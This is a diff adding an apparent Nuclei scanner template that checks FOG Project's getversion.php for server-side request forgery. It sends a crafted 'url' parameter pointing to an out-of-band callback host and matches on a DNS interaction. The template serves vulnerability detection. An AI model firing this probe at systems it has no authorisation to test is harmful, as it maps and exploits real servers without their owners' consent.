@@ -1,0 +1,29 @@
+id: FOG-getversion-SSRF
+
+info:
+  name: FOG-getversion-SSRF
+  author: iSee857
+  severity: high
+  description: |
+    FOG-getversion-SSRF
+  metadata:
+    verified: true
+    max-request: 1
+
+http:
+  - raw:
+      - |
+        GET /fog/service/getversion.php?url=http://{{interactsh-url}} HTTP/1.1
+        Host: {{Hostname}}
+        X-Requested-With: XMLHttpRequest
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - "dns"
+
+      - type: status
+        status:
+          - 200
